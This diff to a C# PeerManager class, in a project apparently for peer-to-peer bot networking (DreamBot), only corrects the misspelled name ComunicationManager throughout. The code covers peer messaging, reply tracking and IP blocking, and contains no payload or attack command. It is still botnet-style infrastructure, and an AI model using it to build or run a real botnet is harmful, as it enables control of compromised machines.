@@ -15,19 +15,19 @@ namespace DreamBot.Network.Protocol.Peers
     {
         private readonly BotIdentifier _botId;
         private readonly IWorkScheduler _worker;
-        private readonly ComunicationManager _comunicationManager;
+        private readonly CommunicationManager _communicationManager;
         internal readonly ReplyWaitManager WaitingForReply;
 
         public EventHandler<PackageReceivedEventArgs<BotHeader>> BotPackageReceivedEventArgs;
         private readonly PeerList _peerList;
 
-        public PeerManager(ComunicationManager comunicationManager, PeerList peerList, IWorkScheduler worker, BotIdentifier botId)
+        public PeerManager(CommunicationManager communicationManager, PeerList peerList, IWorkScheduler worker, BotIdentifier botId)
         {
-            _comunicationManager = comunicationManager;
-            _comunicationManager.PackageReceivedEventArgs += PackageReceivedEventArgs;
+            _communicationManager = communicationManager;
+            _communicationManager.PackageReceivedEventArgs += PackageReceivedEventArgs;
             _worker = worker;
             _botId = botId;
-            WaitingForReply = new ReplyWaitManager(_comunicationManager);
+            WaitingForReply = new ReplyWaitManager(_communicationManager);
 
             _worker.QueueForever(PurgeTimeouts, TimeSpan.FromSeconds(60));
             _peerList = peerList;
@@ -38,7 +38,7 @@ namespace DreamBot.Network.Protocol.Peers
         private void BrokenBotDetected(object sender, BrokenBotDetectedEventArgs e)
         {
             Logger.Verbose(3, "Broken Bot detected at {0}", e.PeerInfo);
-            _comunicationManager.BlockIp(e.PeerInfo.EndPoint.Address);
+            _communicationManager.BlockIp(e.PeerInfo.EndPoint.Address);
         }
 
         private void PackageReceivedEventArgs(object sender, PackageReceivedEventArgs<IPEndPoint> e)
@@ -74,7 +74,7 @@ namespace DreamBot.Network.Protocol.Peers
 
         internal void Ban(IPEndPoint endpoint)
         {
-            _comunicationManager.BlockIp(endpoint.Address);
+            _communicationManager.BlockIp(endpoint.Address);
         }
 
         private bool IsValidHeader(BotHeader botHeader)
@@ -126,7 +126,7 @@ namespace DreamBot.Network.Protocol.Peers
             var endPoint = _peerList[peerBotId];
 
             Logger.Verbose(3, "{0}@{1} {2}", header.BotId, endPoint, header.CorrelationId);
-            _comunicationManager.Send(endPoint, message);
+            _communicationManager.Send(endPoint, message);
             if (correlationId == 0)
             {
                 WaitingForReply.Add(new Package(endPoint, message), header.CorrelationId);
